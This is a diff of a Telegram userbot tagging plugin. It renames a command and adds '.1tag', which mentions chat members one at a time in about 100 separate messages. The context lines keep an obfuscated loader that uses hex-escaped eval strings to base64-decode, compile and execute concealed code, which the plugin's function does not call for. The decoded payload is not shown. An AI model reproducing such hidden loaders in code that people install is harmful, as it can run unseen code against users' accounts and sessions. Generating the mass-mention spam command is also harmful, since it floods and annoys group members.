@@ -24,7 +24,7 @@ trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x6
 eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
 
 
-@register(outgoing=True, pattern="^.tagall$")
+@register(outgoing=True, pattern="^.all$")
 async def _(event):
     if event.fwd_from:
         return
@@ -54,10 +54,30 @@ async def _(event):
         await event.reply(mentions)
     await event.delete()
 
+@register(outgoing=True, pattern="^.1tag(?: |$)(.*)")
+async def _(tag):
+
+	if tag.pattern_match.group(1):
+		seasons = tag.pattern_match.group(1)
+	else:
+		seasons = ""
+
+	chat = await tag.get_input_chat()
+	a_=0
+	await tag.delete()
+	async for i in bot.iter_participants(chat):
+		if a_ == 500:
+			break
+		a_+=5
+		await tag.client.send_message(tag.chat_id, "[{}](tg://user?id={}) {}".format(i.first_name, i.id, seasons))
+		sleep(0.5)
+
 CmdHelp('tagall').add_command(
-    'tagall', None, 'Hərkəsi bir mesajda tağ edər.'
+    'all', None, 'Hərkəsi bir mesajda tağ edər.'
 ).add_command(
-    'tag', None, 'Hərkəsi bir-bir tağ edər.'
+    'tag', None, 'Hərkəsi beş-beş tağ edər.'
+).add_command(
+    '1tag', None, 'Hərkəsi bir-bir tağ edər.'
 ).add_command(
     'admin', None, 'Bu əmri hər hansıxa sohbətdə işlədəndə adminləri tağ edər.'
 ).add()
